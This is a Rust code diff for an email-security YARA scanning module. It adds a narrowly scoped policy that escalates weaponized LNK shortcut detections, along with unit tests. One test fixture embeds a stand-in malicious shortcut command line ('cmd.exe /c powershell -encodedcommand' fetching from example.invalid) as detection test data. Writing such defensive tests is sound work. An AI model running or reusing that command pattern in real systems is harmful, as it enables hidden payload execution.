@@ -11,6 +11,7 @@ use std::time::{Duration, Instant};
 
 use async_trait::async_trait;
 use chrono::Utc;
+use serde::Deserialize;
 use tracing::warn;
 use vigilyx_core::models::{EmailSession, decode_base64_bytes_limited};
 
@@ -31,6 +32,51 @@ const MAX_REPORTED_MATCHES: usize = 64;
 const RTLO_FILENAME_RULE: &str = "Evasion_RTLO_Filename_Spoof";
 const RTLO_FILENAME_DESCRIPTION: &str = "RTLO (U+202E) 文件名欺骗 — 利用右到左覆盖字符伪装扩展名";
 const EXECUTABLE_FILENAME_SUFFIXES: &[&str] = &[".exe", ".scr", ".bat", ".cmd", ".pif", ".com"];
+const WEAPONIZED_LNK_RULE: &str = "Evasion_LNK_Command_Exec";
+const WEAPONIZED_LNK_CATEGORY: &str = "weaponized_lnk_execution";
+
+/// Stage-B admission is intentionally separate from Stage-A YARA rule
+/// precision work. Missing, disabled, or malformed policy preserves the prior
+/// observation-only behavior instead of silently promoting a module result.
+#[derive(Debug, Clone, Deserialize)]
+struct YaraHighFidelityAdmissionPolicy {
+    enabled: bool,
+    admitted_rules: Vec<String>,
+    result_category: String,
+}
+
+impl YaraHighFidelityAdmissionPolicy {
+    fn admits(&self, matched: &YaraMatch, location: &str) -> bool {
+        location.starts_with("attachment:")
+            && self
+                .admitted_rules
+                .iter()
+                .any(|rule| rule == &matched.rule_name)
+            && matches!(matched.fidelity.as_str(), "high" | "exact")
+            && matches!(matched.severity.as_str(), "high" | "critical")
+    }
+}
+
+fn parse_yara_high_fidelity_admission_policy(
+    value: serde_json::Value,
+) -> Option<YaraHighFidelityAdmissionPolicy> {
+    let policy = serde_json::from_value::<YaraHighFidelityAdmissionPolicy>(value).ok()?;
+    let narrow_allowlist = !policy.admitted_rules.is_empty()
+        && policy
+            .admitted_rules
+            .iter()
+            .all(|rule| rule == WEAPONIZED_LNK_RULE);
+    (policy.enabled && narrow_allowlist && policy.result_category == WEAPONIZED_LNK_CATEGORY)
+        .then_some(policy)
+}
+
+fn yara_high_fidelity_admission_policy() -> Option<YaraHighFidelityAdmissionPolicy> {
+    parse_yara_high_fidelity_admission_policy(
+        crate::module_data::module_data()
+            .get_structured("yara_high_fidelity_admission_v1")?
+            .clone(),
+    )
+}
 
 struct LocatedYaraMatch {
     matched: YaraMatch,
@@ -497,9 +543,16 @@ impl SecurityModule for YaraScanModule {
         let mut confidence: f64 = 0.0;
         let mut matched_rule_details = Vec::new();
         let mut structural_details = Vec::new();
+        let high_fidelity_admission = yara_high_fidelity_admission_policy();
 
         for located in &yara_scan.matches {
             let m = &located.matched;
+            let admission_category = high_fidelity_admission
+                .as_ref()
+                .filter(|policy| policy.admits(m, &located.location))
+                .map(|policy| policy.result_category.as_str());
+            let breaker_eligible =
+                (m.breaker_eligible && m.fidelity == "exact") || admission_category.is_some();
             let threat = severity_to_threat(&m.severity);
             if threat > max_threat {
                 max_threat = threat;
@@ -512,6 +565,9 @@ impl SecurityModule for YaraScanModule {
             categories.push("yara_match".to_string());
             if m.breaker_eligible && m.fidelity == "exact" {
                 categories.push("verified_yara_signature".to_string());
+            }
+            if let Some(category) = admission_category {
+                categories.push(category.to_string());
             }
 
             if !rule_names.contains(&m.rule_name) {
@@ -536,7 +592,8 @@ impl SecurityModule for YaraScanModule {
                 "severity": m.severity,
                 "fidelity": m.fidelity,
                 "confidence": m.confidence(),
-                "breaker_eligible": m.breaker_eligible && m.fidelity == "exact",
+                "breaker_eligible": breaker_eligible,
+                "admission_category": admission_category,
             }));
         }
 
@@ -668,6 +725,7 @@ mod tests {
             links: vec![],
             raw_size: 512,
             is_complete: true,
+            raw_mime: None,
             is_encrypted: false,
             truncated: false,
             dropped_attachments: 0,
@@ -767,6 +825,65 @@ mod tests {
             result
                 .categories
                 .contains(&"verified_yara_signature".to_string())
+        );
+    }
+
+    #[tokio::test]
+    async fn governed_weaponized_lnk_match_enters_payload_evidence() {
+        let mut weaponized_lnk = vec![
+            0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+        ];
+        weaponized_lnk.extend_from_slice(
+            b"cmd.exe /c powershell -encodedcommand SQBFAFgA https://example.invalid/a",
+        );
+        let module = YaraScanModule::new(make_engine());
+        let ctx = SecurityContext::new(make_session(
+            Some("Is this you???"),
+            vec![make_attachment("PIC0402023.jpg.lnk", &weaponized_lnk)],
+        ));
+
+        let result = module.analyze(&ctx).await.unwrap();
+
+        assert_eq!(result.threat_level, ThreatLevel::High, "{result:?}");
+        assert!(
+            result
+                .categories
+                .contains(&WEAPONIZED_LNK_CATEGORY.to_string()),
+            "the governed high-fidelity LNK chain must not remain a generic YARA observation: {result:?}"
+        );
+        let detail = result.details["matched_rule_details"]
+            .as_array()
+            .and_then(|items| {
+                items
+                    .iter()
+                    .find(|item| item["rule"].as_str() == Some(WEAPONIZED_LNK_RULE))
+            })
+            .expect("LNK rule detail");
+        assert_eq!(
+            detail["admission_category"].as_str(),
+            Some(WEAPONIZED_LNK_CATEGORY)
+        );
+    }
+
+    #[test]
+    fn high_fidelity_admission_policy_fails_closed_on_scope_expansion() {
+        assert!(
+            parse_yara_high_fidelity_admission_policy(serde_json::json!({
+                "enabled": true,
+                "admitted_rules": [WEAPONIZED_LNK_RULE, "Mal_Vidar_Stealer"],
+                "result_category": WEAPONIZED_LNK_CATEGORY
+            }))
+            .is_none(),
+            "the Stage-B switch must not become a generic YARA promotion path"
+        );
+        assert!(
+            parse_yara_high_fidelity_admission_policy(serde_json::json!({
+                "enabled": false,
+                "admitted_rules": [WEAPONIZED_LNK_RULE],
+                "result_category": WEAPONIZED_LNK_CATEGORY
+            }))
+            .is_none()
         );
     }
 
@@ -969,6 +1086,33 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn declared_pe_is_low_observation_without_malicious_anchor() {
+        let module = YaraScanModule::new(make_engine());
+        let ctx = SecurityContext::new(make_session(
+            Some("Vendor driver package"),
+            vec![make_attachment("vendor-driver.exe", &minimal_pe())],
+        ));
+
+        let result = module.analyze(&ctx).await.unwrap();
+        assert_eq!(result.threat_level, ThreatLevel::Low, "{result:?}");
+        assert!(
+            result
+                .categories
+                .contains(&"executable_attachment".to_string())
+        );
+        assert!(
+            !result
+                .categories
+                .contains(&"verified_executable_payload".to_string())
+        );
+        assert!(
+            !result
+                .categories
+                .contains(&"verified_payload_anchor".to_string())
+        );
+    }
+
+    #[tokio::test]
     async fn disguised_structurally_valid_pe_is_a_verified_payload_anchor() {
         let module = YaraScanModule::new(make_engine());
         let ctx = SecurityContext::new(make_session(
@@ -1144,7 +1288,10 @@ mod tests {
             evidence.description.contains("unterminated_pdf_stream")
                 && evidence.location.as_deref() == Some("attachment:notice.pdf:pdf_stream")
         }));
-        assert_eq!(result.details["coverage_gaps"][0]["reason"], "unterminated_pdf_stream");
+        assert_eq!(
+            result.details["coverage_gaps"][0]["reason"],
+            "unterminated_pdf_stream"
+        );
     }
 
     #[tokio::test]
